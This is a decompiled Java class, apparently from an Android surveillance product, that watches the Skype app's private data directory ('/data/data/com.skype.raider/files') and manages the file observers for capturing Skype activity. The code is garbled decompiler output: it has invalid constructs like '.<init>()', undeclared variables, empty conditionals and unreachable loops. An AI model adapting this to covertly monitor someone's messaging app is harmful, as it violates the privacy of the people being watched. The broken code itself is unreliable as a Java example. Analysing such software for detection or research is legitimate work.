package com.vvt.capture.e.b.a;

import com.vvt.ak.a;
import com.vvt.base.capture.h;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;
import java.util.HashSet;

public class c
  implements m
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private static final boolean c = a.e;
  private static String g;
  private static c i;
  private d d;
  private f e;
  private j f;
  private boolean h;
  private HashSet j;
  
  private c()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.j = localHashSet;
  }
  
  public static c a()
  {
    synchronized (c.class)
    {
      c localc = i;
      if (localc == null)
      {
        localc = new com/vvt/capture/e/b/a/c;
        localc.<init>();
        i = localc;
      }
      localc = i;
      return localc;
    }
  }
  
  private void g()
  {
    boolean bool = true;
    this.h = bool;
    j localj = this.f;
    if (localj == null)
    {
      localj = j.a();
      this.f = localj;
    }
    this.f.a("com.skype.raider", this);
  }
  
  public void a(h paramh)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.j)
    {
      HashSet localHashSet2 = this.j;
      bool = localHashSet2.contains(paramh);
      if (!bool)
      {
        localHashSet2 = this.j;
        localHashSet2.add(paramh);
      }
      g();
      bool = a;
      if (bool) {}
      return;
    }
  }
  
  public void a(String paramString)
  {
    bool = b;
    if (bool) {}
    try
    {
      Object localObject = this.d;
      if (localObject != null)
      {
        bool = b;
        if (bool) {}
        localObject = this.d;
        ((d)localObject).stopWatching();
      }
      localObject = this.e;
      if (localObject != null)
      {
        bool = b;
        if (bool) {}
        localObject = this.e;
        ((f)localObject).stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    this.d = null;
    this.e = null;
    g = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = b;
    if (bool) {}
  }
  
  public void b()
  {
    bool = false;
    Object localObject = null;
    try
    {
      this.h = false;
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d;
        ((d)localObject).stopWatching();
      }
      localObject = this.e;
      if (localObject != null)
      {
        bool = b;
        if (bool) {}
        localObject = this.e;
        ((f)localObject).stopWatching();
      }
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        String str = "com.skype.raider";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    this.d = null;
    this.e = null;
    g = null;
  }
  
  public void b(h paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    synchronized (this.j)
    {
      HashSet localHashSet2 = this.j;
      bool1 = localHashSet2.contains(paramh);
      if (bool1)
      {
        localHashSet2 = this.j;
        localHashSet2.remove(paramh);
      }
      localHashSet2 = this.j;
      int k = localHashSet2.size();
      boolean bool3 = a;
      if ((!bool3) || (k == 0)) {
        b();
      }
      boolean bool2 = a;
      if (bool2) {}
      return;
    }
  }
  
  public void b(String paramString1, String paramString2) {}
  
  public void c(String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = "/data/data/com.skype.raider/files";
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.e;
      if (localObject2 == null)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/e/b/a/f;
        ((f)localObject2).<init>(this, (String)localObject1);
        this.e = ((f)localObject2);
        localObject1 = this.e;
        ((f)localObject1).startWatching();
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = b;
      if (!bool1) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */